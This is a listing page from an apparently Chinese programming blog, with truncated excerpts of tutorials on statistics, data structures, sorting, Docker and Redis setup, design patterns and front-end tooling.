以上设计只记录了单个因变量情况（STAI），为增强研究的有效性，可以对焦虑症进行其他的测量（比如家庭评分、医师评分，以及焦虑症对日常行为的影响评价）。当因变量不止一个时，设计被称作多元方差分析（MANOVA）， 若协变量也存在， 那么就叫多元协方差分析（MANCOVA）。
下面我们主要介绍单因素方差分析与双因素方差分析的原理与实现。
2 单因素方差分析 2.1 推导过程 接下来我们使用种小麦的例子，去帮助理解方差分析里涉及的一些变量。
假设我们现在有若干品种的小麦，要在某一地区播种，我们想知道这些品种的产量有没有显著区别，为此我们先设计了一个田间实验，取一大块地将其分成形状大小都相同的 n n n小块．设供选择的品种有 k k k个，我们打算其中的 n 1 n_1 n1​小块种植品种1, n 2 n_2 n2​小块种植品种2，等等， n 1 + n 2 + . . .
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/344c469dfd272f40e04b8dc17263df0f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ff1d045d2ad91544b1edd0a1be2cf50c/" rel="bookmark">
			使用vscode让scss或less，转换成wxss
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、scss请先下载Easy Sass,less下载Easy Less,我自己是用的scss,所以从图中可以看到我已经安装Easy Sass了。
2、要下载直接搜索框搜索，找到对应的插件就可以了。
3、打开设置文件，可能有些小伙伴不知道怎么打开，我这里说一下（快捷键ctrl+shift+p可以打开搜索，输入setting,点击Preferences:Open Settins(JSON)就可以了）
4、编辑以下配置，这里方便小伙伴们复制，粘贴我把配置放到下面。
"easysass.formats": [ { "format": "expanded", //格式，expanded不压缩，compressed压缩 "extension": ".wxss" //输出文件的后缀,小程序可以写'wxss' }, // { // "format": "compressed", // "extension": ".min.css" // } ], 5、下面是我写的scss
6、这是转换后的wxss
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8980fd879d2a57e6ed5770711cad3975/" rel="bookmark">
			编写程序模拟两个村庄共用同一口井水，编写一个Village类
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 该类有一个静态的int型成员变量waterAmount，用于模拟井水的水量。
在主类Land的main()方法中创建两个村庄，一个村庄改变了waterAmount的值，另一个村庄查看waterAmount的值。 package 面向对象_HomeWork; import java.util.Scanner; public class 水井 { public static void main(String[] args) { Village v1=new Village(); Village v2=new Village(); Scanner s=new Scanner(System.in); System.out.println("请输入改变的值："); int a=s.nextInt(); v1.Drink(a); System.out.println(	"村庄2查看后还剩："+v2.SeeWater(a)+"升水"); } } class Village{ static int waterAmount=1000; public void Drink(int a){ System.out.println("村庄1喝了："+a+"升水"); } public int SeeWater(int change){ return waterAmount=waterAmount-change; } } 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/328662407a26b937439661d280547a69/" rel="bookmark">
			什么是相对路径？什么是绝对路径？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 1.相对路径 绝对路径：从根目录开始，是一个完整的路径。
例：D:\demo\img\g.jpg
2.绝对路径 相对路径：相对于项目目录的路径，在开发中引用js、css、或者图片等，都是使用相对路径。
例：..\img\g\jpg
3.绝对路径和相对路径的区别 参考：https://www.w3cschool.cn/css/question-10231674.html
"." -- 代表目前所在的目录，相对路径。 如：&lt;a href="./abc"&gt;文本&lt;/a&gt; 或 &lt;img src="./abc" /&gt; ".." -- 代表上一层目录，相对路径。 如：&lt;a href="../abc"&gt;文本&lt;/a&gt; 或 &lt;img src="../abc" /&gt; "../../" -- 代表的是上一层目录的上一层目录，相对路径。 如：&lt;img src="../../abc" /&gt; "/" -- 代表根目录,绝对路径。 如：&lt;a href="/abc"&gt;文本&lt;/a&gt; 或 &lt;img src="/abc" /&gt; "D:/abc/" -- 代表根目录,绝对路径。 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9e33cbbb4f0a8c4afb2a2af9190f1041/" rel="bookmark">
			图解操作系统知识总结之内存管理
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		点击上方“五分钟学算法”，选择“星标”公众号
重磅干货，第一时间送达
转自小林coding
前言 之前有不少读者跟我反馈，能不能写图解操作系统？
既然那么多读者想看，我最近就在疯狂的复习操作系统的知识。
操作系统确实是比较难啃的一门课，至少我认为比计算机网络难太多了，但它的重要性就不用我多说了。
学操作系统的时候，主要痛苦的地方，有太多的抽象难以理解的词语或概念，非常容易被劝退。
即使怀着满腔热血的心情开始学操作系统，不过 3 分钟睡意就突然袭来。。。
该啃的还是得啃的，该图解的还是得图解的，万众期待的「图解操作系统」的系列来了。
本篇跟大家说说内存管理，内存管理还是比较重要的一个环节，理解了它，至少对整个操作系统的工作会有一个初步的轮廓，这也难怪面试的时候常问内存管理。
干就完事，本文的提纲：
本文提纲 正文 虚拟内存 如果你是电子相关专业的，肯定在大学里捣鼓过单片机。
单片机是没有操作系统的，所以每次写完代码，都需要借助工具把程序烧录进去，这样程序才能跑起来。
另外，单片机的 CPU 是直接操作内存的「物理地址」。
在这种情况下，要想在内存中同时运行两个程序是不可能的。如果第一个程序在 2000 的位置写入一个新的值，将会擦掉第二个程序存放在相同位置上的所有内容，所以同时运行两个程序是根本行不通的，这两个程序会立刻崩溃。
操作系统是如何解决这个问题呢？
这里关键的问题是这两个程序都引用了绝对物理地址，而这正是我们最需要避免的。
我们可以把进程所使用的地址「隔离」开来，即让操作系统为每个进程分配独立的一套「虚拟地址」，人人都有，大家自己玩自己的地址就行，互不干涉。但是有个前提每个进程都不能访问物理地址，至于虚拟地址最终怎么落到物理内存里，对进程来说是透明的，操作系统已经把这些都安排的明明白白了。
进程的中间层 操作系统会提供一种机制，将不同进程的虚拟地址和不同内存的物理地址映射起来。
如果程序要访问虚拟地址的时候，由操作系统转换成不同的物理地址，这样不同的进程运行的时候，写入的是不同的物理地址，这样就不会冲突了。
于是，这里就引出了两种地址的概念：
我们程序所使用的内存地址叫做虚拟内存地址（Virtual Memory Address）
实际存在硬件里面的空间地址叫物理内存地址（Physical Memory Address）。
操作系统引入了虚拟内存，进程持有的虚拟地址会通过 CPU 芯片中的内存管理单元（MMU）的映射关系，来转换变成物理地址，然后再通过物理地址访问内存，如下图所示：
虚拟地址寻址 操作系统是如何管理虚拟地址与物理地址之间的关系？
主要有两种方式，分别是内存分段和内存分页，分段是比较早提出的，我们先来看看内存分段。
内存分段 程序是由若干个逻辑分段组成的，如可由代码分段、数据分段、栈段、堆段组成。不同的段是有不同的属性的，所以就用分段（Segmentation）的形式把这些段分离出来。
分段机制下，虚拟地址和物理地址是如何映射的？
分段机制下的虚拟地址由两部分组成，段选择子和段内偏移量。
内存分段-寻址的方式 段选择子就保存在段寄存器里面。段选择子里面最重要的是段号，用作段表的索引。段表里面保存的是这个段的基地址、段的界限和特权等级等。
虚拟地址中的段内偏移量应该位于 0 和段界限之间，如果段内偏移量是合法的，就将段基地址加上段内偏移量得到物理内存地址。
在上面了，知道了虚拟地址是通过段表与物理地址进行映射的，分段机制会把程序的虚拟地址分成 4 个段，每个段在段表中有一个项，在这一项找到段的基地址，再加上偏移量，于是就能找到物理内存中的地址，如下图：
内存分段-虚拟地址与物理地址 如果要访问段 3 中偏移量 500 的虚拟地址，我们可以计算出物理地址为，段 3 基地址 7000 + 偏移量 500 = 7500。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9e33cbbb4f0a8c4afb2a2af9190f1041/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/00cda519669fac59a3ea952316fdf410/" rel="bookmark">
			confluent connect写出到ES及ClickHouse
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1 连接Elasticsearch测试 1.1 启动confluent /home/kafka/.local/confluent/bin/confluent start
This CLI is intended for development only, not for production https://docs.confluent.io/current/cli/index.html Using CONFLUENT_CURRENT: /tmp/confluent.swpIapNw Starting zookeeper zookeeper is [UP] Starting kafka kafka is [UP] Starting schema-registry schema-registry is [UP] Starting kafka-rest kafka-rest is [UP] Starting connect connect is [UP] Starting ksql-server ksql-server is [UP] Starting control-center control-center is [UP] 1.2 增加配置 vim /home/kafka/.local/confluent/etc/kafka-connect-elasticsearch/iot-elasticsearch-sink.properties
name=iot-elasticsearch-sink connector.class=io.confluent.connect.elasticsearch.ElasticsearchSinkConnector tasks.max=1 topics=road_traffic key.ignore=true connection.url=http://10.0.165.8:9200 type.name=iot-kafka-connect batch.size=1 flush.timeout.ms=200000 topic.schema.ignore=road_traffic schema.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/00cda519669fac59a3ea952316fdf410/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/aaf06d4a2b4072d0dd6f203194dba2f4/" rel="bookmark">
			二叉堆详解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、什么是二叉堆 二叉堆是完全二叉树或者是近似完全二叉树，它分为两个类型：
最大堆最小堆 最大堆是指任何一个父节点的值，都大于等于它左右孩子节点的值；最小堆是指任何一个父节点的值，都小于等于它左右孩子节点的值
二、二叉堆的自我调整 1.插入节点 我们以下面的最小堆为例，插入元素
新插入的元素为0，将新元素置于二叉堆最后一个位置
我们让新元素与它的父节点比较，如果新元素小于父节点，则与父节点交换位置，否则调整结束
新元素0与父节点5比较，0小于5，0与5交换位置
新元素0继续与父节点2比较，0小于2，0与2交换位置
新元素0继续与父节点1比较，0小于1，0与1交换位置
新元素0到了堆顶的位置，调整结束
2.删除节点 我们同样以前面的二叉堆为例，进行删除元素，删除堆顶元素1
我们将最后一个元素10补到堆顶
接下来，我们将补到堆顶的元素10与它的左右孩子比较，若同时小于左右孩子，则调整结束，否则与左右孩子中较小的一个交换位置
10分别与2、3比较，10大于2、3，2是左右孩子中较小的一个，10与2交换位置
10继续与左右孩子4、5比较，10大于4、5，4是左右孩子中较小的一个，10与4交换位置
10继续与左右孩子8、9比较，10大于8、9，8是左右孩子中较小的一个，10与8交换位置
此时元素10已无孩子节点，调整结束
3.构建二叉堆 构建二叉堆，就是把一个无序的完全二叉树调整为二叉堆，本质上就是让所有非叶子节点依次下沉
我们以下面无序的完全二叉树进行调整，构建二叉堆
我们先找到最后一个非叶子节点3，将它与它的左右孩子比较，若同时小于左右孩子，则该叶子节点调整结束，否则与左右孩子中较小的一个交换位置
3与1比较，3大于1，3与1交换位置
接着比较下一个非叶子节点7，7大于孩子节点2、4，其中2是较小的孩子节点，7与2交换位置
接着比较下一个非叶子节点8，8同时小于孩子节点9、10，不需要交换位置
继续比较下一个非叶子节点6，6大于孩子节点1、2，其中1是较小的孩子节点，6与1交换位置
交换后，6还有孩子节点3，6与3比较，6大于孩子节点3，6与3交换位置
接着比较最后一个非叶子节点5，5与孩子节点1、8比较，5大于1，5与1交换位置
5继续与孩子节点2、3比较，5大于2、3，其中2是较小的孩子节点，5与2交换位置
5继续与孩子节点7、4比较，5大于4，5与4交换位置
自此，二叉堆的构建完成
三、代码实现 二叉堆的所有节点都存在数组中，若父节点的下标是parent，则左右孩子节点的下标分别为2parent+1，2parent+2
// 上浮调整 function upAdjust(arr) { let childIndex = arr.length - 1; let parentIndex = parseInt((childIndex - 1) / 2); // 缓存子节点的值，用于最后进行赋值，而不需要每一步进行交换 let temp = arr[childIndex]; while (childIndex &gt; 0 &amp;&amp; temp &lt; arr[parentIndex]) { arr[childIndex] = arr[parentIndex]; childIndex = parentIndex; parentIndex = parseInt((childIndex - 1) / 2); } arr[childIndex] = temp; } // 下沉调整 function downAdjust(arr, parentIndex, length) { // 缓存父节点的值，用于最后进行赋值，而不需要每一步进行交换 let temp = arr[parentIndex]; // 孩子节点下标，暂时定为左孩子节点下标 let childIndex = 2 * parentIndex + 1; while (childIndex &lt; length) { // 当存在右孩子节点，且右孩子节点的值小于左孩子节点的值，childIndex记录为右孩子节点的下标 // childIndex实际记录的是最小的孩子节点的下标 if (childIndex + 1 &lt; length &amp;&amp; arr[childIndex + 1] &lt; arr[childIndex]) { childIndex++; } // 如果父节点的值比孩子节点的值都小，则调整结束 if (temp &lt;= arr[childIndex]) { break; } // 将最小的孩子节点的值赋值给父节点 arr[parentIndex] = arr[childIndex]; parentIndex = childIndex; childIndex = 2 * parentIndex + 1; } arr[parentIndex] = temp; } function buildHeap(arr) { // 从最后一个非叶子节点开始下沉调整 for (let i = parseInt(arr.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/aaf06d4a2b4072d0dd6f203194dba2f4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0c0282c92a46981f4987a54e0aa35aa6/" rel="bookmark">
			Ubuntu下Docker安装,设置镜像加速，基础用法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		官网教程 在Ubuntu上安装Docker Engine
操作系统要求 Ubuntu Focal 20.04 (LTS)Ubuntu Eoan 19.10Ubuntu Bionic 18.04 (LTS)Ubuntu Xenial 16.04 (LTS) 如果已安装老版本 需要先卸载 sudo apt-get remove docker docker-engine docker.io containerd runc 更新apt软件包索引并安装软件包以允许apt通过HTTPS使用存储库： $ sudo apt-get update $ sudo apt-get install \ apt-transport-https \ ca-certificates \ curl \ gnupg-agent \ software-properties-common 添加Docker的官方GPG密钥： $ curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add - 设置存储库 $ sudo add-apt-repository \ "deb [arch=amd64] https://download.docker.com/linux/ubuntu \ $(lsb_release -cs) \ stable" 到这一步，如果系统内置python版本有过改动，可能会报错
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0c0282c92a46981f4987a54e0aa35aa6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e887a811b2c9b79d5b3e56acddea17aa/" rel="bookmark">
			《面向对象程序设计》课程设计
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、课程设计题目
结合实际，用面向对象程序设计的思想设计一个应用实例，要求用到下面设计要求中提到的知识点5个以上。
二、设计要求
通过此次课程设计，更好地掌握面向对象程序设计的基本概念及编程方法，进一步加深对继承性、多态性、抽象类、动态联编、重载、静态成员、静态成员函数、运算符重载、异常处理等知识点的理解，在实际运用中合理选用子对象、堆对象、对象数组、对象指针及对象引用等复杂对象。
三、几点说明
1．本次课程设计可以单人独立完成，也可以由两人合作完成，不允许3人及以上的合作。两人合作只提交一份文档。
2．6月8日提交，以《面向对象程序设计》各课堂的学生名单为准。
3．每一份课程设计文档包含：
(1) 设计报告，WORD文档
(2) 代码，CPP源代码(所有代码放在一个文件中)，代码须在VC++6.0环境下编译运行
(3) 分工，WORD文档，两人合作时在此文档中写明各人分别承担了哪些工作，独立完成者不需要提交此项
3．将以上文档压缩打包，压缩包以“学号姓名”为文件主名，两人合作则一前一后排列两个人的学号姓名，提交压缩包后请主动跟班干部确认。
四、评分标准
对每一份完整的文档先按下面的方式计算总分，然后以60-69为及格，70-79为中等，80-89为良好，90-100为优秀登录成绩。合作完成者两人成绩相同。
只要应用实例是用面向对象程序设计的思想设计的，程序正确，并用到设计要求中提到的知识点5个，就可以得70分。应用实例是用面向对象程序设计的思想设计的，但用到的知识点少于5个，最多只能得60分。如果应用实例不是用面向对象程序设计的思想设计的，将不及格。
各知识点的说明正确，可增加10分。
知识点多余5个，可增加5分。
程序有实用性，可增加5分。
课程设计报告规范，可增加10分。
五、对雷同的处理
与他人设计内容相近部分达1/2及以上者视为抄袭(不区分抄与被抄，请保护好自己的作品。可以与他人交流思想，但具体内容必须自己完成)，成绩为“不及格”。
课程设计目的 培养应用《面向对象程序设计》设计方法及思想解决实际问题的能力，近一步理解课堂上抽象的知识和方法。如使同学们可以结合理论知识和方法，系统化，全面分析问题，并能独立设计解决实际问题的结构和算法。掌握使用面向对象程序设计语言C++，熟悉面向对象开发平台Visual C++6.0。提高程序设计和调试能力。提高编程能力，学会书写课程设计
课程设计内容 建立一个小学生的成绩管理系统包括：
学生的基本信息：姓名 学号 班级
基本操作：数据的录入
数据修改：错误数据的修改
数据删除：毕业学生，错误数据
数据插入：插入新学生
数据查询：按学号 姓名
数据排序：按学号或者总分或平均分
整体设计（设计了哪些类，每个类的功能与声明，类之间的关系，继承关系需要画出相应DAG图） 类名为student：成员函数包括
显示内存动态数据记录函数 函数原型 void show();
功能 显示内存你面的记录
返回值 无返回值
查找记录函数 函数原型 void search();
功能 根据关键字，查询是否存在需要的信息
返回值 无返回值
修改记录函数 函数原型void change();
功能 修改指定的关键字
返回值 无
工作方式 根据指定的关键字，查找栈中符合的信息并显示信息
4.添加记录信息
函数原型 void add();
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e887a811b2c9b79d5b3e56acddea17aa/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3909fc8b3db4024cacd652e999658ac2/" rel="bookmark">
			C&#43;&#43;将字符串中的数字提取到数组中
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 对于一个数组，如果输入的形式是字符串，如“[1,2,3,4]”，我们没法直接使用里面的数字，为此，要将数字提取出来。
若key=false且当前字符是数字，则当前字符是该数的第一个字符，加入数组中，如果其前一个字符为负号，则该数为负数。若key=true且当前字符是数字，则当前字符不是数字的第一个字符，要与数组中的最后一个数字进行组合。
vector&lt;int&gt; strToArr(string str){ int len = str.size(); vector&lt;int&gt; res; bool key = false; for (int i = 0; i &lt; len; i++){ if (str[i] &gt;= '0' &amp;&amp; str[i] &lt;= '9'){//遇到数字 if (key)//不是数字的第一个字符 *(res.end()-1) = *(res.end()-1) * 10 + str[i] - '0'; else{ int tmp = str[i]-'0'; if (str[i-1] == '-')//负数 tmp *= -1; res.push_back(tmp);//将数字的第一个字符添加到数组中 key = true; } } else//遇到的不是数字 key = false; } return res; } 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a2b70d4231ae3c7c2767354190308b9e/" rel="bookmark">
			批量删除rabbitmq的队列和交换机
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		不知道大家有没有遇到过需要批量删除rabbitmq的队列和交换机的场景，我就遇到几次，主要是开始设计的时候没有想那么多，后面项目多了，用的又是一个rabbitmq，需要重新设计队列和交换机的名称，需要把已经创建的队列和交换机删除。rabbitmq提供了批量删除队列的操作，但没有批量删除交换机的操作。而且它自带的批量删除必须登陆到安装rabbitmq的服务器上操作才行，于是我自己用python写了一段脚本用于删除队列或者交换机。
第一步 修改rabbitmq配置 修改rabbitmq_delete.py中rabbitmq的配置：
host = '127.0.0.1' port = '15672' username = 'rabbitmq' password = 'xxxx' 第二步 执行python命令 删除队列: python3 rabbitmq_delete.py -k ‘udata.climb’ -d 1
删除交换机: python3 rabbitmq_delete.py -k ‘udata.climb’ -d 2
命令说明：
-k 指定队列前缀，如udata.climb，则类似udata.climb.user, udata.climb.menu这种的会被删除-d 指定删除队列还是交换机，1表示队列，2表示交换机。 python脚本地址：https://download.csdn.net/download/wjf8882300/12560275
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/effb1a2076541bd80a93f12267ca5bb8/" rel="bookmark">
			数据分析（Python） 插值——牛顿插值法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		插值思想 求已知的n个点对(x1,y1),(x2,y2),…,(xn,yn)的所有阶差商公式
联立以上差商公式建立如下插值多项式f(x)
其中P(x)是牛顿插值逼近函数，R(x)是误差函数
差商表 xkf(xk)一阶差商二阶差商三阶差商x0f(x0)x1f(x1)f[x0,x]x2f(x2)f[x1,x2]f[x0,x1,x2]x3f(x3)f[x2,x3]f[x1,x2,x3]f[x0,x1,x2,x3]…………… 代码实现 import numpy as np import matplotlib.pyplot as plt import random y_point = [] text_list = [] x_point = random.sample(range(0,12),10)#生成不重复的随机数 for num in range(10): y_point.append(random.randint(1, 12))#生成1-20随机整数 text='('+str(x_point[num])+','+str(y_point[num])+')'#合并字符串 text_list.append(text) plt.annotate(text_list[num],xy=(x_point[num],y_point[num]),xytext=(x_point[num]+0.5,y_point[num]+0.5)) #annotate第一个参数是文本内容 第二个参数是要标记的位置 第三个参数是文本标记位置 x = np.arange(min(x_point)-0.01,max(x_point)+0.003,0.003) def whole(n):#计算数值(x-x0)(x-x1)...(x-xn) n为项数次序 if(n==1): return y_point[0] else: sum = 1 for i in range(n-1): sum = sum * (x-x_point[i]) return sum def difference(n):#计算差分公式 f(x0,x1) n为项数次序 if n==1: return 1 else: _2Dlist = [([0] * (n - 1)) for i in range(n - 1)]#从f(x0,x1)开始的三角矩阵 #f(x0,x1),f(x1,x2),f(x2,x3) for i in range(n - 1): _2Dlist[i][0] = (y_point[i + 1] - y_point[i]) / (x_point[i + 1] - x_point[i]) #先计算三角矩阵第一列 for a in range(1,n-1): #a代表列 n=4 a=2,b=23;a=3,b=3 for b in range(a,n-1): #b代表行 _2Dlist[b][a]=(_2Dlist[b][a-1]-_2Dlist[b-1][a-1])/(x_point[b+1]-x_point[b-a]) #计算三角矩阵除第一列以外所有数据元素 print(_2Dlist) #打印差商表 return _2Dlist[n-2][n-2] def newton(n):#n为数据元素个数 sum = 0 for i in range(n): sum = sum + whole(i+1)*difference(i+1) return sum plt.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/effb1a2076541bd80a93f12267ca5bb8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d7dcbb38f7c9ac1c8df69213329ac157/" rel="bookmark">
			redis启动时闪退，史上最详细的解决办法，看完还解决不了来找我
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		redis启动时闪退，解决办法如下： 1.Windows+r 进入cmd，
2.cd进入到redis-server.exe所在文件夹下，
3.写入redis-server.exe redis.windows.conf ，回车
4.如出现如图所示错误，打开redis.windows.conf，有一行 bind 127.0.0.1 ，前面不要有#
5.保存后退出，再来redis-server.exe redis.windows.conf，如果还报错，按下图输入
6.这时其实就已经可以了，如果打开redis-server.exe还是闪退，如下操作
7.与redis-server.exe同文件夹下新建start.txt ,里面写入redis-server.exe redis.windows.conf ，保存后退出，
8.把.txt后缀改为.bat,双击start.bat即可打开redis，出现我们所熟悉的小图片
【鸣谢大佬】参考自https://blog.csdn.net/qq_40361770/article/details/80454248?utm_source=app
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e6666a00b25c78b40e6eb130b502cfc8/" rel="bookmark">
			【Python基础】字符串逆序（反转）输出的几种方式实例
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 逆序：给定字符串，按照顺序逆序输出 1、字符串切片，索引的方式，这种方式经常用来考题 切片方式：第一个表示开始索引(留空0), 第二个表示结束索引(留空为最后一个,即-1，也就是字符串的最后一个字符), 第三个是步长（每次取最后一个）
str = "ABCDEFG" print(str[::-1]) 输出：GFEDCBA 2、reversed()
reversed是Python内置的函数 str = "ABCDEFG" print(''.join(reversed(str))) 输出：GFEDCBA 3、借组列表进行翻转 str = ("ABCDEFG") order = [] for i in str: order.append(i) order.reverse() #将列表反转 print(''.join(order) ) #将list转换成字符串 4、利用range()语法： range(start,end,step=1):顾头不顾尾循环逆序输出
正序遍历： range(5):默认step＝1，start＝0,生成可迭代对象，包含[0, 1, 2, 3, 4] range(1,5):指定start＝1，end = 5，默认step＝1，生成可迭代对象，包含[1, 2, 3, 4] range(1,10,2):指定start＝1，end＝10，step＝2，生成可迭代对象，包含[1, 3, 5, 7, 9] 逆序遍历 range(9,-1,-1):step＝-1，start＝9,生成可迭代对象，包含[9, 8, 7, 6, 5, 4, 3, 2, 1, 0] 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c4189a1c5dbdf5ffeea962a451063f11/" rel="bookmark">
			Java设计模式（十五）——————【行为型模式】设计模式之访问者模式
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		源码地址：【行为型模式】设计模式之访问者模式
目录 基本介绍基本原理应用案例1、需求2、UML类图3、代码实现 总结 基本介绍 访问者模式（Visitor Pattern），封装一些作用于某种数据结构的各元素的操作，它可以在不改变数据结构的前提下定义作用于这些元素的新的操作。
主要将数据结构与数据操作分离，解决 数据结构和操作耦合性问题
访问者模式的基本工作原理是：在被访问的类里面加一个对外提供接待访问者的接口
访问者模式主要应用场景是：需要对一个对象结构中的对象进行很多不同操作(这些操作彼此没有关联)，同时需要避免让这些操作"污染"这些对象的类，可以选用访问者模式解决
基本原理 原理图如下：
1、Visitor：抽象的访问者，为该对象结构中的ConcreteElement的每一个类声明一个visit操作
2、ConcreteVisitor：一个具体的访问者，实现每个有Visitor 声明的操作，是每个操作实现的部分
3、ObjectStructure：能枚举它的元素，可以提供一个高层的接口，用来允许访问者访问元素
4、Element：抽象元素，定义一个能接收访问者对象的抽象方法（accept）
5、ConcreteElement：具体的元素，实现了能接收访问者对象的抽象方法（accept）
应用案例 1、需求 将人分为男人和女人，对歌手进行测评，当看完某个歌手表演后，得到他们对该歌手不同的评价(评价 有不同的种类，比如 成功、失败 等)。
2、UML类图 3、代码实现 //抽象的访问者 public abstract class Action { public abstract void getManResult(Man man); public abstract void getWomanResult(Woman woman); } //具体的访问者 public class Success extends Action { @Override public void getManResult(Man man) { System.out.println("男人给的测评是成功。。。。。。。。"); } @Override public void getWomanResult(Woman woman) { System.out.println("女人给的测评是成功。。。。。。。。"); } } //具体的访问者 public class Fail extends Action { @Override public void getManResult(Man man) { System.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c4189a1c5dbdf5ffeea962a451063f11/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/db9c5b4b4a73fed06a38376ff8597869/" rel="bookmark">
			快速排序（交换排序）——思路及代码实现
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		快速排序：
快速排序是冒泡排序的改进版，也是最好的一种内排序，在很多面试题中都会出现，也是作为程序员必须掌握的一种排序方法。
基本步骤为：
1.在待排序的元素任取一个元素作为基准(通常选第一个元素，但最的选择方法是从待排序元素中随机选取一个作为基准)，称为基准元素；
2.将待排序的元素进行分区，比基准元素大的元素放在它的右边，比其小的放在它的左边；
3.对左右两个分区重复以上步骤直到所有元素都是有序的。
下面来看一个完整的演示过程： 数组序列顺序：4 6 5 2 7 3 1 8 快速排序顺序：1 2 3 4 5 6 7 8 字数不多，4张图了解一下，不懂留言； 下面来看一下代码实现： #include&lt;stdio.h&gt; //不按顺序展示数组数据 /* //高级一点的遍历 void show(int *arry){ int i=0; int *tmp; tmp = arry; for( ;i&lt;8;i++) printf("%d ",*tmp++); printf("\n"); }*/ //普通遍历方式 void show(int arry[]){ int i=0; for( ;i&lt;8;i++) printf("%d ",arry[i]); printf("\n"); } //用来交换数的位置 void change(int *a, int *b){ int tmp; tmp=*a; *a=*b; *b=tmp; } //快速排序展示 void sort(int *arry, int l, int r){ int *tmp; int i=l,j=r; if( l &gt;= r ) return; tmp = arry; //当左面的数小于右面，右面自减，再次比较 while(l&lt;r){ while(l&lt; r &amp;&amp; tmp[l] &lt;= tmp[r]){ r--; } //改变数组的位置，即地址 change(&amp;tmp[l], &amp;tmp[r]); //这个是，当左面的数小于右面，左面自增，再次比较 while(l &lt; r &amp;&amp; tmp[l] &lt;= tmp[r]){ l++; } change(&amp;tmp[l], &amp;tmp[r]); } //递归函数 //左面 sort(arry, i, l - 1); //右面 sort(arry ,l+1 ,j); }	int main(){ //自定义数组 int arry[8] = {4,6,5,2,7,3,1,8}; // l=数组首下标 ，r=数组尾下标 int l=0,r=7; //先展示一下自定义数组 printf("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/db9c5b4b4a73fed06a38376ff8597869/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e5c2a17aa35a0d7a51cdfb3930c00c52/" rel="bookmark">
			缓存缓存CSS的策略
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
